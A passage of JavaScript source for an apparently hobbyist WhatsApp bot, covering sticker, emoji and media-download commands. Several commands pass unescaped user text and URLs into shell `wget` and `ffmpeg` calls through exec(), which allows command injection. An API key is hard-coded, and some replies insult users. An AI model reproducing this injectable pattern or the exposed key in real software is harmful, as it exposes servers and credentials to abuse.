await Fan.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: setQuoted })
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break
//━━━━━━━━━━━━━━━[ EMOJI ]━━━━━━━━━━━━━━━━━//
case 'emojiap':{
if (!q) return setReply('emojinya?')
setReply("Converting to emoji Apple")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[0].url}`
Fan.sendImageAsSticker(from, teks, setQuoted)
})
}
break	            
case 'emojigo':{
if (!q) return setReply('emojinya?')
setReply("Converting to emoji Google")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[1].url}`
Fan.sendImageAsSticker(from, teks, setQuoted)
})
}
break	             
case 'emojisa':{
if (!q) return setReply('emojinya?')
setReply("Converting to emoji Samsung")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[2].url}`
Fan.sendImageAsSticker(from, teks, setQuoted)
})
}
break	             
case 'emojims':{
if (!q) return setReply('emojinya?')
setReply("Converting to emoji Microsoft")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[3].url}`
Fan.sendImageAsSticker(from, teks, setQuoted)
})
}
break	             
case 'emojiwa':{
if (!q) return setReply('emojinya?')
setReply("Converting to emoji WhatsApp")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[4].url}`
Fan.sendImageAsSticker(from, teks, setQuoted)
})
}
break	
case 'emojitw':{
if (!q) return setReply('emojinya?')
setReply("Converting to emoji Twitter")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[5].url}`
Fan.sendImageAsSticker(from, teks, setQuoted)
})
}
break	
case 'emojifb':{
if (!q) return setReply('emojinya?')
setReply("Converting to emoji Facebook")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[6].url}`
Fan.sendImageAsSticker(from, teks, setQuoted)
})
}
break	
case 'emojijp':{
if (!q) return setReply('emojinya?')
await setReply("Converting to emoji joypixel")
await emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[7].url}`
Fan.sendImageAsSticker(from, teks, setQuoted)
})
}
break	       
case 'emojiom':{
if (!q) return setReply('emojinya?')
await setReply("Converting to emoji openmoji")
await emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[8].url}`
Fan.sendImageAsSticker(from, teks, setQuoted)
})
}
break	      
case 'emojied':{
if (!q) return setReply('emojinya?')
await setReply("Converting to emoji emojidex")
await emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[9].url}`
Fan.sendImageAsSticker(from, teks, setQuoted)
})
}
break	      
case 'emojimes':{
if (!q) return setReply('emojinya?')
await setReply("Converting to emoji messenger")
await emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[10].url}`
Fan.sendImageAsSticker(from, teks, setQuoted)
})
}
break	  
case 'emojilt':{
if (!q) return setReply('emojinya?')
await setReply("Converting to emoji logitech")
await emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[11].url}`
 Fan.sendImageAsSticker(from, teks, setQuoted)
})
}
break	  
case 'emojimo':{
if (!q) return setReply('emojinya?')
await setReply("Converting to emoji mozila")
await emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[13].url}`
Fan.sendImageAsSticker(from, teks, setQuoted)
})
}
break
case 'emojimix': {
let [emoji1, emoji2] = q.split`+`
if (!emoji1) return setReply( `Example : ${prefix + command} 😅+🤔`)
if (!emoji2) return setReply( `Example : ${prefix + command} 😅+🤔`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await Fan.sendImageAsSticker(from, res.url, setQuoted)
}
}
break
//━━━━━━━━━━━━━━━[ STICKER ]━━━━━━━━━━━━━━━━━//
case 'sticker':  case 's':
if (isImage || isQuotedImage) {
try{
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
let media = await Fan.downloadAndSaveMediaMessage(quoted)
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: authorName, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await Fan.sendMessage(from,{sticker: nah},{quoted: setQuoted})
await fs.unlinkSync(stok)
await fs.unlinkSync(media)
} catch (err){
if(err){ return}
var stream = await downloadContentFromMessage(mek.message.imageMessage || mek.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
var buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
var rand1 = 'sticker/'+getRandom('.jpg')
var rand2 = 'sticker/'+getRandom('.webp')
fs.writeFileSync(`./${rand1}`, buffer)
ffmpeg(`./${rand1}`)
.on("error", console.error)
.on("end", () => {
exec(`webpmux -set exif ./media/sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
await Fan.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: setQuoted })
await fs.unlinkSync(`./${rand1}`)
await fs.unlinkSync(`./${rand2}`)
})
})
.addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
.toFormat('webp')
.save(`${rand2}`)
}
} else if (isVideo || isQuotedVideo) {
try{
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
let media = await Fan.downloadAndSaveMediaMessage(quoted)
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: authorName, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 1, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await Fan.sendMessage(from,{sticker: nah},{quoted: mek})
await fs.unlinkSync(stok)
await fs.unlinkSync(media)
} catch (err){
var stream = await downloadContentFromMessage(mek.message.imageMessage || mek.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
var buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
var rand1 = 'sticker/'+getRandom('.mp4')
var rand2 = 'sticker/'+getRandom('.webp')
fs.writeFileSync(`./${rand1}`, buffer)
ffmpeg(`./${rand1}`)
.on("error", console.error)
.on("end", () => {
exec(`webpmux -set exif ./media/sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
await Fan.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: setQuoted })
await fs.unlinkSync(`./${rand1}`)
await s.unlinkSync(`./${rand2}`)
})
})
.addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
.toFormat('webp')
.save(`${rand2}`)
}
} else {
setReply(`Kirim gambar/vidio dengan caption ${command} atau balas gambar/vidio yang sudah dikirim\nNote : Maximal vidio 10 detik!`)
}
break
case 'attp':
try {
if (args.length == 0) return setReply(`Example: ${prefix + command} Fan`)
//let buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
await Fan.sendMessage(from, {sticker: {url:`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}` }}, { quoted: setQuoted })
} catch (e) {
console.log(e)
setReply(`Maap sedang error coba lagi besok`)            
}
break
case 'smeme': {
if (!q) return setReply(`Masukan teks, contoh : ${prefix}smeme teks|teks`)
var top = q.split('|')[0] ? q.split('|')[0] : ''
var bottom = q.split('|')[1] ? q.split('|')[1] : ''           
if (isQuotedImage ) {
onlyWait()
try{
let { Sticker, StickerTypes } = require('wa-sticker-formatter')
let olalah = await Fan.downloadAndSaveMediaMessage(quoted)
let anuah = await TelegraPh(olalah)
let media = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${anuah}`
await makeSticker(media,Sticker, StickerTypes)
await fs.unlinkSync(olalah)

} catch (err){
let olalah = await Fan.downloadAndSaveMediaMessage(quoted)
let anuah = await TelegraPh(olalah)
let ranp = getRandom('.gif')
let rano = getRandom('.webp')
let anu2 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${anuah}`
exec(`wget ${anu2} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, async (err) => {
if (err) return setReply(`${err}`)
await Fan.sendMessage(from,{sticker: fs.readFileSync(rano)}, {quoted: setQuoted})
await fs.unlinkSync(rano)
await fs.unlinkSync(ranp)
})
}
} else {
setReply('Gunakan foto!')
}
}
break
case 'triggered': case 'wasted': case 'comrade': case 'horny': case 'blur': case 'pixelate': case 'simpcard': case 'lolice': case 'glass':
if (isQuotedVideo && mek.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage.fileLength < 10000000 || isQuotedImage || isImage) {
onlyWait()
try{
let { Sticker, StickerTypes } = require('wa-sticker-formatter')
let olalah = await Fan.downloadAndSaveMediaMessage(quoted)
let anuah = await TelegraPh(olalah)
let media = `https://some-random-api.ml/canvas/${command}?avatar=${anuah}`
await makeSticker(media,Sticker, StickerTypes)
await fs.unlinkSync(olalah)

} catch (err){  
let owgi = await Fan.downloadAndSaveMediaMessage(quoted)
let anu = await TelegraPh(owgi)
let ranp = getRandom('.gif')
let rano = getRandom('.webp')
let anu4 = `https://some-random-api.ml/canvas/${command}?avatar=${anu}`
exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, async (err) => {
if (err) return setReply(`${err}`)
await Fan.sendMessage(from, {sticker: fs.readFileSync(rano)}, {quoted: setQuoted})
await fs.unlinkSync(owgi)
await fs.unlinkSync(ranp)
await fs.unlinkSync(rano)
})
}
  
} else if (isQuotedText) {
onlyWait()

try{
let { Sticker, StickerTypes } = require('wa-sticker-formatter')
let olalah = await Fan.profilePictureUrl(mentionByReply, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png') 
let media = `https://some-random-api.ml/canvas/${command}?avatar=${olalah}`
await makeSticker(media,Sticker, StickerTypes)
await fs.unlinkSync(olalah)

} catch (err){  
console.log(err)
let oppp = await Fan.profilePictureUrl(mentionByReply, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
let anu4 = `https://some-random-api.ml/canvas/${command}?avatar=${oppp}`
let ranp = getRandom('.gif')
let rano = getRandom('.webp')
exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, async (err) => {
if (err) return setReply(`${err}`)
await Fan.sendMessage(from, {sticker: fs.readFileSync(rano)}, {quoted: setQuoted})
await fs.unlinkSync(oppp)
await fs.unlinkSync(ranp)
await fs.unlinkSync(rano)
})
}
}  else {
setReply('Gunakan foto!')
}
break
case 'take':
if (isImage || isQuotedImage|| isQuotedSticker) {
try{
let ahuh = args.join(' ').split('|')
let satu = ahuh[0] !== '' ? ahuh[0] : `${ownerName}`
let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
let media = await Fan.downloadAndSaveMediaMessage(quoted)
let jancok = new Sticker(media, {
pack: satu, // The pack name
author: dua, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await Fan.sendMessage(from,{sticker: nah},{quoted: setQuoted})
await fs.unlinkSync(stok)
await fs.unlinkSync(media)
} catch (err){
console.log(err)
}
}
break
case 'patrick':
onlyWait()
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
Fan.sendImageAsSticker(from, pjr, setQuoted)
}
)
break
case 'gura':
onlyWait()
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
Fan.sendImageAsSticker(from, pjr, setQuoted)
}
)
break
case 'doge':
onlyWait()
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
//Fan.sendMedia (from, pjr, setQuoted, {caption: "Nih"})
Fan.sendImageAsSticker(from, pjr, setQuoted)
}
)
break
//━━━━━━━━━━━━━━━[ DOWNLOAD ]━━━━━━━━━━━━━━━━━//
case 'play':{
if (!q) return setReply("Teksnya mana om")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
let rus = await yts(q)
if (rus.all.length == "0") return setReply("Video tidak bisa di download")
let data = await rus.all.filter(v => v.type == 'video')
try{
var res = data[0]
var info = await ytdl.getInfo(res.url);
} catch{
var res = data[1]
var info = await ytdl.getInfo(res.url);
}
let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
try{
var thumbnya =`https://i.ytimg.com/vi/${res.videoId}/mqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${res.videoId}/sqdefault.jpg`
}
let inithumb = await getBuffer(thumbnya)
let options2 =
{ 
externalAdReply: {
title: `⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻`, 
body: `   ━━━━⬤──────────    click here to play music `,
description: 'Now Playing...',
mediaType: 2,
thumbnail: inithumb,
mediaUrl: res.url,
sourceUrl: res.url
}
}   
var toks =`
📂 Judul : ${res.title}
🌐 Ditonton : ${h2k(res.views)} Kali 
⏳ Durasi : ${res.timestamp}
👤 Channel : ${res.author.name}
🎧 Audio : ${FileSize(audio[0].contentLength)} 
🎬 Video : ${FileSize(format.contentLength)}`

let aklo = [
{"buttonId": `${prefix}playmp3 ${res.url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}playmp4 ${res.url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
]
Sendbutdocument(from, `*YOUTUBE DOWNLOADER*\n${toks}`, fake, ofrply, aklo, options2)
}
break
case 'playmp3':
if (!isUrl) return setReply("Masukan link")
try{
setReply("*Downloading...*")
let info = await ytdl.getInfo(q);
let audioFormats = ytdl.filterFormats(info.formats, 'audioonly');
try{
var low = audioFormats[2].contentLength
} catch (err){
var low = audioFormats[0].contentLength
}
if(Number(low) > 15000000 ) return setReply(`Bjir sizenya ${FileSize(low)}\nAu ah ga mao download 😤`)
if(audioFormats[0].contentLength == "undefined"){
var rus = await yts(q)
var data = await rus.all.filter(v => v.type == 'video')
var res = data[0]
if(res.timestamp.split(":") > "10") return setReply("Tidak bisa mendownload audio lebih dari 10 menit")
}
downloadMp3(q) 
} catch (err){
console.log(err)
}
break
case 'playmp4':{
if (!isUrl) return setReply("Masukan link")
let info = await ytdl.getInfo(q);
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
if(Number(format.contentLength) > 40000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)
if(format.contentLength == "undefined"){
var rus = await yts(q)
var data = await rus.all.filter(v => v.type == 'video')
var res = data[0]
if(res.timestamp.split(":") > "10") return setReply("Tidak bisa mendownload video lebih dari 10 menit")
}
setReply("*Downloading...*")
downloadMp4 (q) 
}
break
case 'playmusic':
{
if (!q) return setReply("Masukan judul lagu")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
if(q.startsWith("https://")){
let nana = q.replace('https://m.', 'https://')
let scdl = await SoundCloud.create();
let res = await scdl.tracks.getTrack(nana)
console.log(res)
let teks =`
*SOUNDCLOUD DOWNLOADER*

📂 Judul : ${res.title}
⏰ Durasi : ${Math.round(res.full_duration/1000/60)} Menit
◀️ Diputar : ${h2k(res.playback_count)} kali
❤️ Disukai : ${h2k(res.likes_count)}
🌏 Release : ${res.release_date}
♻️ Repost : ${h2k(res.reposts_count)}
🔈 Format : ${res.track_format}
`
try{
let anuah = res.artwork_url.replace('large', 'crop')
var yamiyami = await getBuffer(anuah)
} catch(err) {
let anuh ="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTilzqEC5QYKt2_J8OyIBNlciLAd1sbCKgpNA&usqp=CAU"
var yamiyami = await getBuffer(anuh)
}
let nano = [
{"buttonId": `${prefix}scmp3 ${res.permalink_url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}scdoc ${res.permalink_url}`,"buttonText": {"displayText": `ᴅᴏᴄᴜᴍᴇɴᴛ`},"type": "RESPONSE"}
]

Fan.sendButImage(from, teks, fake, yamiyami, nano, {contextInfo: forward}) 

} else {

let scdl = await SoundCloud.create();
let result = await scdl.search({
query: q,
limit: 20, 
offset: 0, 
filter: 'tracks' 
});

let res = result.collection[0] 

try{
var artis = res.publisher_metadata.artist
var album = res.publisher_metadata.album_title
} catch (err){
var artis = res.user.full_name
var album = "Tidak ada"
}
console.log(res)
let teks =`
*SOUNDCLOUD DOWNLOADER*

📂 Judul : ${res.title}
👤 Artis : ${artis}
💽 Album : ${album}
⏰ Durasi : ${Math.round(res.full_duration/1000/60)} Menit
◀️ Diputar : ${h2k(res.playback_count)} kali
❤️ Disukai : ${h2k(res.likes_count)}
🌏 Release : ${res.release_date}
♻️ Repost : ${h2k(res.reposts_count)}
🔈 Format : ${res.track_format}
`

try{
let anuah = res.artwork_url.replace('large', 'crop')
var yamiyami = await getBuffer(anuah)
} catch(err) {
let anuh ="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTilzqEC5QYKt2_J8OyIBNlciLAd1sbCKgpNA&usqp=CAU"
var yamiyami = await getBuffer(anuh)
}
let nano = [
{"buttonId": `${prefix}scmp3 ${res.permalink_url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}scdoc ${res.permalink_url}`,"buttonText": {"displayText": `ᴅᴏᴄᴜᴍᴇɴᴛ`},"type": "RESPONSE"}
]
Fan.sendButImage(from, teks, fake, yamiyami, nano, {contextInfo: forward}) 
}
}
break
case 'scmp3':{
if (!q) return setReply("Masukan Link")
if(q.includes("social_sharing")) return setReply("Masukan link dengan benar")
let nana = q.replace('https://m.', 'https://')
setReply("*Downloading...*")
let scdl = await SoundCloud.create();
let track = await scdl.tracks.getTrack(nana);
let menit = Math.round(track.full_duration/1000/60)
if(menit > 10) return setReply("Tidak bisa mendownload musik lebih dari 10 menit")
scdlMp3(nana)
}
break
case 'scdoc':{
if (!q) return setReply("Masukan Link")
if(q.includes("social_sharing")) return setReply("Masukan link dengan benar")
let nana = q.replace('https://m.', 'https://')
setReply("*Downloading...*")
let scdl = await SoundCloud.create();
let track = await scdl.tracks.getTrack(nana);
let menit = Math.round(track.full_duration/1000/60)
if(menit > 10) return setReply("Tidak bisa mendownload musik lebih dari 10 menit")
scdlDoc(nana)
}
break 
case 'ig':{
onlyWait()
if (!q) return setReply('Linknya?')
let igreel = q.includes("https://www.instagram.com/reel/")

if(igreel){
Download.insta_reel(q).then(async (data) => {
await Fan.sendMessage(from, {caption: `Nih`, video: {url: data.url} }, {quoted: setQuoted})
console.log(data)
console.log(data.url)
})
} else {
var { igDownloader } = require('./lib/igdown')
res = await igDownloader(`${q}`).catch(e => {
return setReply(mess.error.api)
})
console.log(res)
Fan.sendMedia (from, res.result.link, setQuoted, {caption: "Nih"})
}
}
break
case 'gimage':{
if (args.length < 1) return setReply('Apa Yang Mau Dicari?')
try{
googleImage(q).then(async (data) => {
//console.log(data)
let foto = data[Math.floor(Math.random() * data.length)]
if(data.length == "0") return setReply("Image tidak di temukan")
onlyWait()
Fan.sendMedia (from, foto, setQuoted, {caption: "Nih"})
})
} catch(err){
let teks = args.join(' ')
let res = await gis(teks, google)
function google(error, result){
if (error){ return setReply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
Fan.sendMedia (from, random, setQuoted, {caption:  `*Hasil Pencarian Dari :* ${teks}`})
}
}
}
}
break
case 'tiktokmusik':{       
if (args.length < 1) return setReply('Link?')
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply("Error link")
if (args.length < 1) return setReply('Link?')
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply("Error link")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
if (q.startsWith("https://vt.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://vm.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://www.tiktok.com/")){
var lin = args[0]
} else {
return setReply("Masukan link tikok, contoh https://vt.tiktok.com/")
}
onlyWait()
tiktokdlv2(lin).then( async res => {
let ep = res.video.no_watermark                    
let nana = await getBuffer(ep)
let ran = getRandom('.mp3')
let ron = getRandom('.mp4')
fs.writeFileSync(ron, nana)
exec(`ffmpeg -i ${ron} -vn ${ran}`, (err) => {
fs.unlinkSync(ron)
if (err) return setReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
Fan.sendMessage(from, { audio: buffer453, mimetype: 'audio/mp4'}, { quoted: setQuoted })
fs.unlinkSync(ran)
})
})
}
break
case 'tiktoknowm': 
case 'tiktok':{   
if (args.length < 1) return setReply('Link?')
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply("Error link")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
if(q.startsWith("https://vt.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://vm.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://www.tiktok.com/")){
var lin = args[0]
} else {
return setReply("Masukan link tikok, contoh https://vt.tiktok.com/")
}
onlyWait()
tiktokdlv2(lin).then(res => {
let ep = res.video.no_watermark
console.log(ep)
Fan.sendMessage(from, {caption: "Nih", video: {url: ep}},{quoted: setQuoted})
})
}
break
case 'pinterest':
if (args.length < 2) return setReply(`Kirim perintah ${command} query atau ${command} query --jumlah\nContoh :\n${command} cecan atau ${command} cecan --10`)
onlyWait()
var jumlah;
if (q.includes('--')) jumlah = q.split('--')[1]
pinterest(q.replace('--'+jumlah, '')).then(async(data) => {
if (q.includes('--')) {
if (data.result.length < jumlah) {
jumlah = data.result.length
setReply(`Hanya ditemukan ${data.result.length}, foto segera dikirim`)
}
for (let i = 0; i < jumlah; i++) {
Fan.sendMessage(from, { image: { url: data.result[i] }})
}
} else {
var but = [{buttonId: `${command} ${q}`, buttonText: { displayText: 'Next Photo' }, type: 1 }]
Fan.sendMessage(from, { caption: `Hasil pencarian dari ${q}`, image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: setQuoted })
}
})
break
case 'ytmp3':
{
if(!q) return setReply("Masukan link youtube")
if (q.includes("https://youtube.com/channel/")) return setReply("Goblok itu bukan link vidio bangsat")
setReply("*Scrapping...*")
let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if(q.includes("https://youtu.be/")){
var videoId = q.replace('https://youtu.be/', '')
} else if(q.includes("https://youtube.com/watch?v=")){
var videoId = q.split('=')[1]
} else if(q.includes("https://youtube.com/shorts/")){
var videoId = q.replace('https://youtube.com/shorts/', '')
}  else {
return setReply("Link salah")
}
let link =`https://youtube.com/watch?v=${videoId}` 
let anu = await yts(link)
if(anu.all.length == "0") return setReply("Musik tidak di temukan")
try{
var foto = `https://i.ytimg.com/vi/${videoId}/hqdefault.jpg`
} catch (err){
var foto = anu.all[0].image
} 
try{
let info = await ytdl.getInfo(link);
let format = ytdl.filterFormats(info.formats, 'audioonly');
if(Number(format.contentLength) > 20000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)

let teks =`*YOUTUBE AUDIO DOWNLOADER*

📂 Title : ${info.videoDetails.title}
📄 Size : ${FileSize(format[0].contentLength)}
🆔 ID : ${videoId}
⏲️ Duration : ${anu.all[0].timestamp}
📊 Viewers : ${h2k(anu.all[0].views)}
🌐 Upload At : ${anu.all[0].ago}
🔖 Author : ${anu.all[0].author.name}
👤 Channel : ${anu.all[0].author.url}
🔗 Url : ${anu.all[0].url}
📝 Description : ${anu.all[0].description}`
await Fan.sendMessage(from, {image: {url: foto}, caption: teks},{quoted: setQuoted})
downloadMp3(q) 
} catch(err){
setReply(err)
}
}
break
case 'ytmp4':
try{
if (q.includes("https://youtube.com/channel/")) return setReply("Goblok itu bukan link vidio bangsat")
setReply("*Scrapping...*")
if(q.includes("https://youtu.be/")){
var videoId = q.replace('https://youtu.be/', '')
} else if(q.includes("https://youtube.com/watch?v=")){
var videoId = q.split('=')[1]
} else if(q.includes("https://youtube.com/shorts/")){
var videoId = q.replace('https://youtube.com/shorts/', '')
}  else {
return setReply("Link salah")
}
let link =`https://youtube.com/watch?v=${videoId}`
let anu = await yts(link)
if(anu.all.length == "0") return setReply("Video tidak di temukan")
let info = await ytdl.getInfo(link);
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
if(Number(format.contentLength) > 40000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)

let teks =`*YOUTUBE VIDEO DOWNLOADER*

📂 Title : ${anu.all[0].title}
💾 Ext : 360p
📄 Size : ${FileSize(format.contentLength)}
🆔 ID : ${videoId}
⏲️ Duration : ${anu.all[0].timestamp}
🌎 Viewers : ${h2k(anu.all[0].views)}
🌐 Upload At : ${anu.all[0].ago}
🔖 Author : ${anu.all[0].author.name}
📹 Channel : ${anu.all[0].author.url}
🔗 Url : ${anu.all[0].url}
📝 Description : ${anu.all[0].description}`
await Fan.sendMessage(from, {image: {url: anu.all[0].image}, caption: teks},{quoted: setQuoted})
downloadMp4(q) 
} catch(err){
setReply(`${err}`)
}
break 
case 'mediafire':{
if(q.startsWith("https://www.mediafire.com")){
let nana = await mediafiredl(q)
if(nana.filename == "") return setReply("Error itu bukan file, kalo ga tau cara make mediafire mending ga usah make") 
console.log(nana)
let tuks =`
Data succesfull obtained

File Name : ${nana.filename}
File Size : ${nana.filesizeH}
Upload : ${nana.aploud}
`
await setReply(tuks)
if(nana.filesize > 50000 && !isOwner){
if(sender.startsWith("62")){
